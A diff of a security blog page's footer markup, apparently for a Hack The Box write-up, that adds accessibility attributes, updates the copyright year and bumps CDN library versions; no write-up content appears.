-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/htb/">htb</a>,&nbsp;<a href="/tags/ftp/">ftp</a>,&nbsp;<a href="/tags/sqli/">sqli</a>,&nbsp;<a href="/tags/re/">RE</a>,&nbsp;<a href="/tags/lkm/">lkm</a>,&nbsp;<a href="/tags/whois/">whois</a>,&nbsp;<a href="/tags/pcap/">pcap</a>,&nbsp;<a href="/tags/ffuf/">ffuf</a>,&nbsp;<a href="/tags/fuzz/">fuzz</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/linux/">linux</a>,&nbsp;<a href="/tags/htb/">htb</a>,&nbsp;<a href="/tags/ftp/">ftp</a>,&nbsp;<a href="/tags/sqli/">sqli</a>,&nbsp;<a href="/tags/re/">RE</a>,&nbsp;<a href="/tags/lkm/">lkm</a>,&nbsp;<a href="/tags/whois/">whois</a>,&nbsp;<a href="/tags/pcap/">pcap</a>,&nbsp;<a href="/tags/ffuf/">ffuf</a>,&nbsp;<a href="/tags/fuzz/">fuzz</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/zetta/" class="prev" rel="prev" title="Zetta"><i class="fas fa-angle-left fa-fw"></i>Zetta</a>
-            <a href="/nephack3/" class="next" rel="next" title="Nephack 3.0">Nephack 3.0<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/zetta/" class="prev" rel="prev" title="Zetta"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Zetta</a>
+            <a href="/nephack3/" class="next" rel="next" title="Nephack 3.0">Nephack 3.0<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
+        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw"></i>
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
             </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw"></i>
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
